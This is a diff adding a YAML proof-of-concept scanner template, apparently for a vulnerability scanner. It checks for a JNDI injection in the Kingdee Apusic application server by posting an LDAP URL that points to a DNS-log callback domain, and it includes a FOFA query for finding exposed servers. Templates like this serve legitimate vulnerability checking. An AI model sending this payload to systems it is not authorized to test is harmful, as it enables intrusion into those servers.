@@ -1,0 +1,27 @@
+id: poc-yaml-kingdee-Apusic-loadtree-jndi
+info:
+  name: 金蝶 Apusic loadtree Jndi注入
+  severity: critical
+  tags:
+  - DNSLOG
+  - 两高一弱
+  - 命令注入
+  finger: Apusic应用服务器
+  fofa: app="Apusic应用服务器"
+variables:
+  reverse: new_dns_log()
+  domain: reverse.Domain()
+requests:
+- method: POST
+  path: /admin//protect/jndi/loadTree
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: jndiName=ldap%3a//{{.domain}}/123.jpg
+  expression: 'status_code == 200 &&
+
+    contains(headers,"text/html") &&
+
+    reverse.Sleep(2)
+
+    '
+transport: http
